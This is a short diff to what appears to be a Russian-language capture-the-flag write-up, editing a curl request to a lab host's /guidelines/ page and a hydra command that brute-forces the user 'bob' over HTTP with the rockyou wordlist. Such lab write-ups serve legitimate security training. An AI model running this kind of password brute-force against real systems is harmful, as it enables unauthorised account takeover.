@@ -33,11 +33,11 @@ dirsearch -u http://10.129.187.90
 И gobuser нашел еще один путь 
 
 ```
-curl http://10.129.187.90/guidelines//                                                                              
+curl http://10.129.187.90/guidelines/                                                                    
 Hey <b>bob</b>, did you update that TomCat server?
 
 ```
 ```
-hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.129.187.90 -s 1234 http-get /manager/html
+hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.129.187.90 -s 80 http-get /protected/
 
 ```
